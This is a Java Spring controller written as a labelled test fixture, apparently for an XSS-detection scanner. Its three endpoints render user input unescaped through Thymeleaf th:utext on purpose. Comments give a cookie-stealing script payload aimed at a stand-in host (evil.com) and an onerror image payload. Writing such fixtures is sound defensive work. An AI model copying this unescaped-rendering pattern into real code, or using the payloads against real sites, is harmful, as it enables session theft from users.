// Fixture: java-thymeleaf-utext — Thymeleaf th:utext with user-controlled content
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-79
// Agent: xss
// Pattern: th:utext outputs unescaped HTML; user input flows to model attribute rendered with th:utext

package com.example.xss;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RequestBody;

@Controller
public class ContentController {

    // VULNERABLE: User input rendered with th:utext (unescaped text)
    // Template: <div th:utext="${announcement}"></div>
    // th:utext outputs raw HTML without escaping, unlike th:text which auto-escapes
    // Attacker sends: ?message=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
    @GetMapping("/announcement")
    public String announcement(
            @RequestParam(defaultValue = "Welcome!") String message,
            Model model) {

        // Developer intends to allow "rich text" but doesn't sanitize
        model.addAttribute("announcement", message);
        // Template uses: <div class="banner" th:utext="${announcement}"></div>
        return "announcement";
    }

    // VULNERABLE: User-submitted comment stored and rendered with th:utext
    // This is a stored XSS pattern — input stored in DB, later rendered unescaped
    @PostMapping("/comment")
    public String postComment(
            @RequestParam String articleId,
            @RequestParam String author,
            @RequestParam String body,
            Model model) {

        // Simulate saving to database (body is not sanitized)
        Comment comment = new Comment(author, body);
        commentRepository.save(articleId, comment);

        // Template renders: <div class="comment-body" th:utext="${comment.body}"></div>
        // Attacker submits body: <img src=x onerror=alert(1)>
        model.addAttribute("comments", commentRepository.findByArticle(articleId));
        return "article";
    }

    // VULNERABLE: User-provided HTML fragment injected into email preview
    // Template: <div th:utext="${emailBody}"></div>
    @GetMapping("/email/preview")
    public String emailPreview(
            @RequestParam String subject,
            @RequestParam String body,
            Model model) {

        model.addAttribute("subject", subject);
        // VULNERABLE: body rendered as raw HTML via th:utext in template
        model.addAttribute("emailBody", body);
        return "email_preview";
    }

    // Stub types for compilation context
    static class Comment {
        private final String author;
        private final String body;

        Comment(String author, String body) {
            this.author = author;
            this.body = body;
        }

        public String getAuthor() { return author; }
        public String getBody() { return body; }
    }

    interface CommentRepository {
        void save(String articleId, Comment comment);
        java.util.List<Comment> findByArticle(String articleId);
    }

    @org.springframework.beans.factory.annotation.Autowired
    private CommentRepository commentRepository;
}
